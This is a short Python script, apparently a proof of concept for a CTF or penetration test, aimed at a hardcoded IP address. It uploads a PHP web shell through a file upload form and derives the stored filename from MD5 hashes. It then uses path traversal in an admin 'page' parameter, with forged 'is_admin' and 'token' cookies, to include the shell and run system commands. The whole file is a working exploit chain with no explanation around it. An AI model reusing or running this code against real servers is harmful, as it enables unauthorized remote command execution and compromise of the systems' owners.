import requests
import hashlib
import urllib

target = "http://54.251.213.12"

def uploadShell():
    shell = '<?php echo system($_GET["cmd"]);?>'
    filename = "shelly.php"
    files = {
        'uploadDir': (None, f"aW5ldHB1Yi9mdHByb290Lw=="),
        'fileToUpload': (filename, shell),
        'submit': (None, 'Upload')
    }
    r = requests.post(target + "/upload", files=files)

    h = hashlib.new('md5')
    h.update(shell.encode())
    front = h.hexdigest()[0:5]

    h = hashlib.new('md5')
    h.update(filename.split('.')[0].encode())
    back = h.hexdigest()

    return front + "_" + back

def localFileInclusionRCE(fileHash):
    command = urllib.parse.quote("hostname && ipconfig")
    cookies = {
        "token" : "1",
        "is_admin" : "1"
    }
    r = requests.get(target + "/admin?page=../ftproot/" + fileHash + ".php&cmd=" + command, cookies=cookies)
    print(r.text)

def verify():
    fileHash = uploadShell()
    localFileInclusionRCE(fileHash)

if __name__ == "__main__":
    verify()